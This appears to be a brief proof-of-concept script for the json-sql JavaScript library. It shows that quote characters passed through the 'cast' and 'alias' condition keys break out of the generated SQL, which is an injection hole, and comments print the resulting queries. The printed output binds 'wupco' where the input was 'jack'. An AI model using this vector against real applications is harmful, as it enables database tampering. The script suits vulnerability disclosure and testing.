var jsonSql = require('json-sql')();

function testselect(query) {
    var sql = jsonSql.build({
        type: 'select',
        table: 'users',
        fields: ['name', 'age'],
        condition: query
    });
    console.log(sql);
}

console.log("[*] result of hipar : cast\n");
testselect({"name":"jack","id":{"cast":"aaa'\"bbb"}});
console.log("\n[*] result of hipar : alias\n");
testselect({"name":"jack","id":{"alias":"aaa'\"bbb"}});
/*

[*] result of hipar : cast

{
  query: `select "name", "age" from "users" where "name" = $p1 and cast("id" as aaa'"bbb);`,
  values: { p1: 'wupco' },
  prefixValues: [Function: prefixValues],
  getValuesArray: [Function: getValuesArray],
  getValuesObject: [Function: getValuesObject]
}

[*] result of hipar : alias

{
  query: `select "name", "age" from "users" where "name" = $p1 and "id" as "aaa'"bbb";`,
  values: { p1: 'wupco' },
  prefixValues: [Function: prefixValues],
  getValuesArray: [Function: getValuesArray],
  getValuesObject: [Function: getValuesObject]
}


*/

